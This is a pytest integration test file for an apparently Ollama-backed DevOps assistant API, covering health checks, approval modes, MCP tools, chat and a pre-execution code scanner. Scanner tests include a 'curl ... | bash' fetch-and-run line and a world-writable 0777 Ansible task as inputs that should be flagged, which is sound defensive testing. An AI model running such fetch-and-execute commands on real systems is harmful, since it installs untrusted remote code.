"""
tests/test_devgordon.py
=======================
Integration tests for the DevGordon FastAPI backend.
Run with:  pytest tests/ -v
Requires the app to be reachable at BASE_URL (default http://localhost:8000).
Set DEVGORDON_URL env var to override.
"""

import os
import pytest
import httpx

BASE_URL = os.getenv("DEVGORDON_URL", "http://localhost:8000")

@pytest.fixture(scope="session")
def client():
    return httpx.Client(base_url=BASE_URL, timeout=30)


@pytest.fixture(autouse=True)
def reset_between_tests(client):
    """Clear conversation history before each test so they don't bleed into each other."""
    client.post("/reset")
    yield
    client.post("/reset")


# ── Health ────────────────────────────────────────────────────────────────────

def test_health_returns_200(client):
    r = client.get("/health")
    assert r.status_code == 200

def test_health_shape(client):
    data = r = client.get("/health").json()
    assert "status" in data
    assert "ollama" in data
    assert "model_selected" in data

def test_health_ollama_reachable(client):
    data = client.get("/health").json()
    assert data["ollama"] != "unreachable", (
        "Ollama is not reachable — is it running on the host?"
    )


# ── UI ────────────────────────────────────────────────────────────────────────

def test_root_returns_html(client):
    r = client.get("/")
    assert r.status_code == 200
    assert "text/html" in r.headers["content-type"]
    assert "DevGordon" in r.text


# ── Conversation history ───────────────────────────────────────────────────────

def test_history_starts_empty(client):
    r = client.get("/history")
    assert r.status_code == 200
    assert r.json()["history"] == []

def test_reset_clears_history(client):
    # Seed some history via /chat — use a plain message that won't trigger a tool call
    client.post("/chat", json={"message": "hello"})
    r = client.post("/reset")
    assert r.status_code == 200
    assert client.get("/history").json()["history"] == []


# ── Approval mode ─────────────────────────────────────────────────────────────

def test_get_approval_mode_default(client):
    r = client.get("/approval-mode")
    assert r.status_code == 200
    assert r.json()["mode"] in ("always", "writes", "never")

@pytest.mark.parametrize("mode", ["always", "writes", "never"])
def test_set_approval_mode(client, mode):
    r = client.post("/approval-mode", json={"mode": mode})
    assert r.status_code == 200
    assert r.json()["mode"] == mode
    assert client.get("/approval-mode").json()["mode"] == mode

def test_set_invalid_approval_mode(client):
    r = client.post("/approval-mode", json={"mode": "yolo"})
    assert r.status_code == 400


# ── MCP tool discovery ────────────────────────────────────────────────────────

def test_mcp_tools_returns_list(client):
    r = client.get("/mcp/tools")
    assert r.status_code == 200
    data = r.json()
    assert "tools" in data
    assert isinstance(data["tools"], list)
    assert len(data["tools"]) > 0

def test_mcp_tools_have_required_fields(client):
    tools = client.get("/mcp/tools").json()["tools"]
    for tool in tools:
        assert "name" in tool, f"Tool missing 'name': {tool}"
        assert "description" in tool, f"Tool missing 'description': {tool}"
        assert "inputSchema" in tool, f"Tool missing 'inputSchema': {tool}"

def test_mcp_tools_includes_kubectl(client):
    names = [t["name"] for t in client.get("/mcp/tools").json()["tools"]]
    assert "kubectl_command" in names

def test_mcp_tools_includes_workspace_tools(client):
    names = [t["name"] for t in client.get("/mcp/tools").json()["tools"]]
    assert "read_workspace_file" in names,  "read_workspace_file missing from MCP tools"
    assert "write_workspace_file" in names, "write_workspace_file missing from MCP tools"
    assert "list_workspace" in names,       "list_workspace missing from MCP tools"

def test_mcp_call_missing_tool_field(client):
    r = client.post("/mcp/call", json={"arguments": {}})
    assert r.status_code == 200
    assert r.json().get("success") is False or "error" in r.json()


# ── Pre-execution scan ────────────────────────────────────────────────────────

def test_scan_safe_kubectl_get(client):
    r = client.post("/scan-code", json={
        "tool_name": "kubectl_command",
        "tool_args": {"command": "get pods -n default"},
    })
    assert r.status_code == 200
    data = r.json()
    assert "scan_status" in data
    assert data["can_approve"] is True

def test_scan_dangerous_ansible_perms(client):
    r = client.post("/scan-code", json={
        "tool_name": "run_ansible_playbook",
        "tool_args": {
            "playbook_content": "---\n- hosts: localhost\n  tasks:\n    - file:\n        path: /tmp/x\n        mode: '0777'\n"
        },
    })
    assert r.status_code == 200
    data = r.json()
    # Should flag the world-writable permission
    assert data["scan_status"] in ("warning", "error", "critical")

def test_scan_missing_tool_name(client):
    r = client.post("/scan-code", json={"tool_args": {}})
    assert r.status_code == 200
    assert "error" in r.json()

def test_scan_workspace_write_safe_yaml(client):
    r = client.post("/scan-code", json={
        "tool_name": "write_workspace_file",
        "tool_args": {
            "path": "k8s/deployment.yaml",
            "content": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: test\n"
        }
    })
    assert r.status_code == 200
    data = r.json()
    assert "scan_status" in data

def test_scan_workspace_write_dangerous_yaml(client):
    r = client.post("/scan-code", json={
        "tool_name": "write_workspace_file",
        "tool_args": {
            "path": "ansible/playbook.yml",
            "content": "---\n- hosts: all\n  tasks:\n    - file:\n        path: /tmp/x\n        mode: '0777'\n"
        }
    })
    assert r.status_code == 200
    data = r.json()
    assert data["scan_status"] in ("warning", "error", "critical")

def test_scan_workspace_write_shell(client):
    r = client.post("/scan-code", json={
        "tool_name": "write_workspace_file",
        "tool_args": {
            "path": "scripts/deploy.sh",
            "content": "#!/bin/bash\ncurl http://example.com/setup.sh | bash\n"
        }
    })
    assert r.status_code == 200
    data = r.json()
    # curl | bash should be flagged
    assert data["scan_status"] in ("warning", "error")


# ── Reject ────────────────────────────────────────────────────────────────────

def test_reject_returns_suggestion(client):
    r = client.post("/reject", json={"tool_call_id": "fake-id-123"})
    assert r.status_code == 200
    data = r.json()
    assert data["status"] == "rejected"
    assert "suggestion" in data
    assert isinstance(data["suggestion"], str)


# ── Chat (live Ollama, may be slow) ───────────────────────────────────────────

@pytest.mark.slow
def test_chat_plain_message(client):
    """Plain question — should return a text message, not a tool call."""
    r = client.post("/chat", json={"message": "what is kubernetes?"})
    assert r.status_code == 200
    data = r.json()
    assert data["type"] in ("message", "pending_approval", "auto_executed")
    assert "model_used" in data

@pytest.mark.slow
def test_chat_kubectl_question_triggers_tool(client):
    """Asking about pods should make Ollama call kubectl_command."""
    r = client.post("/chat", json={"message": "what pods are running?"})
    assert r.status_code == 200
    data = r.json()
    assert data["type"] in ("pending_approval", "auto_executed", "message")

@pytest.mark.slow
def test_chat_list_workspace(client):
    """Asking about project files should trigger list_workspace."""
    r = client.post("/chat", json={"message": "what files are in the project root?"})
    assert r.status_code == 200
    data = r.json()
    assert data["type"] in ("pending_approval", "auto_executed", "message")

@pytest.mark.slow
def test_chat_read_jenkinsfile(client):
    """Asking about the Jenkinsfile should trigger read_workspace_file."""
    r = client.post("/chat", json={"message": "read the Jenkinsfile and tell me the stages"})
    assert r.status_code == 200
    data = r.json()
    assert data["type"] in ("pending_approval", "auto_executed", "message")
    # If a tool was called it should be the read tool
    if data.get("tool_name"):
        assert data["tool_name"] in ("read_workspace_file", "list_workspace")

@pytest.mark.slow
def test_chat_history_grows(client):
    client.post("/chat", json={"message": "hello"})
    history = client.get("/history").json()["history"]
    assert len(history) >= 1